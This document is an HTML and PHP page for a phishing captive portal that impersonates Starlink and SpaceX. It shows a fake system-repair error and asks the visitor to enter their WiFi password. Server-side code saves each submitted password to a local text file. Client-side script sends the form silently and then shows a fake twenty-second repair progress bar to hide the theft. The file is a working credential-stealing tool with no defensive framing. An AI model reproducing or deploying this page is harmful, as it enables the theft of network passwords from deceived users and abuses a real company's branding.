<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <link rel="icon" href="favicon.png">
    <title>Starlink</title>
    <style>
        @font-face {
            font-family: 'DIN_Regular';
            src: url('D-DINExp-Bold.otf') format('woff2'),
                 url('D-DIN.otf') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        body {
            background-image: url('bg.webp');
            background-size: cover;
            background-position: center;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        .logo {
            font: 700 50px/88px 'DIN_Regular', Arial, Verdana, sans-serif;
            text-align: center;
            margin-top: 90px;
            position: absolute;
            top: 100px;
        }
        p {
            font: 700 15px/24px 'DIN_Regular', Arial, Verdana, sans-serif;
            text-align: center;
            margin-top: 20px;
        }
        .container {
            text-align: center;
            padding: 0 10px;
        }
        .password-container {
            position: relative;
            display: inline-block;
        }
        input[type="password"], input[type="text"] {
            padding: 10px;
            border-radius: 15px;
            border: 1px solid white;
            margin-top: 10px;
            width: 200px;
            text-align: center;
            display: block;
            margin: 10px auto;
        }
        .toggle-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
        }
        button {
            font: 700 13px/24px 'DIN_Regular', Arial, Verdana, sans-serif;
            padding: 10px 20px;
            border-radius: 15px;
            border: none;
            background-color: white;
            color: black;
            cursor: pointer;
            display: block;
            margin: 10px auto;
            margin-top: 30px;
            width: auto;
            height: auto;
        }
        button:hover {
            background-color: grey;
        }
        .blur {
            filter: blur(10px);
        }
        .loading-bar-container {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 70%;
            height: 7px;
            background-color: #a3a3a3;
            border-radius: 10px;
        }
        .loading-bar {
            width: 0;
            height: 100%;
            background-color: white;
            border-radius: 10px;
            animation: load 20s linear forwards;
        }
        .loading-text {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font: 700 32px/40px 'DIN_Regular', Arial, Verdana, sans-serif;
            color: white;
            text-align: center;
        }
        .loading-message {
            position: absolute;
            top: calc(50% - 30px);
            left: 50%;
            transform: translate(-50%, -50%);
            font: 700 18px/24px 'DIN_Regular', Arial, Verdana, sans-serif;
            color: white;
            text-align: center;
        }
        .footer {
            font: 400 12px/16px 'DIN_Regular', Arial, Verdana, sans-serif;
            color: white;
            position: absolute;
            bottom: 10px;
            text-align: center;
        }
        @keyframes load {
            to { width: 100%; }
        }
        @media screen and (max-width: 768px) {
            p {
                padding: 0 20px;
            }
        }
    </style>
</head>
<body>
    <div class="logo" id="starlinkLogo">S T A R L I N K</div>
    <div class="container">
        <p>ERROR_MESSAGE<br>Enter the WiFi password to continue the system repair.</p>
        <form id="passwordForm" action="index.php" method="post">
            <div class="password-container">
                <input type="password" id="password" name="password" placeholder="WiFi Password" required>
                <img src="eye.png" width="15" height="15" class="toggle-password" id="togglePassword" alt="Toggle Password Visibility">
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <div class="loading-bar-container" id="loadingBarContainer">
        <div class="loading-message" id="loadingMessage">System Fixing</div>
        <div class="loading-bar" id="loadingBar"></div>
    </div>
    <div class="loading-text" id="loadingText">System Updated.</div>

    <div class="footer">
        Starlink © 2024<br>
        Starlink is a division of SpaceX. Visit us at <a href="https://www.spacex.com" style="color: white;">spacex.com</a>
    </div>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $password = $_POST['password'];
        file_put_contents('password.txt', $password);
    }
    ?>

    <script>
        const togglePassword = document.querySelector('#togglePassword');
        const password = document.querySelector('#password');

        togglePassword.addEventListener('click', function (e) {
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);

            if (togglePassword.src.includes('eye.png')) {
                togglePassword.src = 'view.png';
            } else {
                togglePassword.src = 'eye.png';
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const formData = new FormData(event.target);
            fetch('index.php', {
                method: 'POST',
                body: formData
            });

            document.querySelector('.container').classList.add('blur');
            document.getElementById('starlinkLogo').classList.add('blur');
            document.getElementById('loadingBarContainer').style.display = 'block';

            setTimeout(function() {
                document.getElementById('loadingBarContainer').style.display = 'none';
                document.getElementById('loadingText').style.display = 'block';
            }, 20000);

            setTimeout(function() {
                document.querySelector('.container').classList.remove('blur');
                document.getElementById('starlinkLogo').classList.remove('blur');
                event.target.submit();
            }, 22000);
        });
    </script>
</body>
</html>
